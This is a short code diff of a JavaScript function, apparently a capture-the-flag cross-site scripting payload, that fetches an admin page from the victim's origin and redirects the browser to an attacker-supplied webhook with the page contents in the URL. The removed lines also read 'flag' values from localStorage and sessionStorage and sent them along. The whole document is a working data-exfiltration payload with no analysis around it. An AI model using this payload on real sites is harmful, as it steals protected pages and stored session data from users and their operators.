@@ -1,15 +1,11 @@
 async function sendFlagToWebhook(webhookUrl) {
   try {
-    const response = await fetch('/admin');
+    const response = await fetch('/admin/secret');
     const data = await response.text();
     console.log(data);
 
     const encodedData = encodeURIComponent(data);
-    const localData = localStorage.getItem('flag');
-    const encodedcookie = encodeURIComponent(localData);
-    const sessionData = sessionStorage.getItem('flag');
-    const ensessionData = encodeURIComponent(sessionData);
-    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}&cookies=${encodedcookie}&flag=${ensessionData}`;
+    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;
 
     document.location = urlWithQueryParams;
   } catch (error) {
